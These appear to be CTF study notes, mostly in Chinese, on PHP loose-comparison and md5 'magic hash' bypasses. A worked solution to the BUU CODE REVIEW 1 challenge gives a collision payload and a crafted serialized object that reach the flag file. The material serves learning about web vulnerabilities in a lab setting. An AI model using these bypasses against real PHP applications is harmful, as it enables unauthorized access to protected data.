# PHP

## Basic

### POST and GET

* GET参数直接附加在url上，用`&`隔开
* POST参数，HTTP头部添加`Content-Type: application/x-www-form-urlencoded`，报文主体空一行写body，同样用`&`隔开



## 比较绕过

PHP `==`为弱比较，`===`为强比较。比较绕过：https://blog.csdn.net/qq_47804678/article/details/128814377

Refer: https://blog.csdn.net/weixin_44511709/article/details/102912004

* PHP中，`==`弱类型判断
* **当md5结果为`0exxxx`，则php当作科学计数法，永远为0**







### Example 1

Example: BUU CODE REVIEW 1

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

1. 使用弱相等碰撞
   ```
   pleasepost=2&md51=s1885207154a&md52=s1836677006a&obj=1
   ```

2. 反序列化漏洞

   * 强比较，需要将`input`指向`correct`，创造完全相等
     ```php
     $obj = new BUU;
     $obj->input = &obj->correct;
     echo serialize($obj);
     ```

   * 使用 PHP playground 运行，输出序列化结果
     ```
     O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
     ```

     

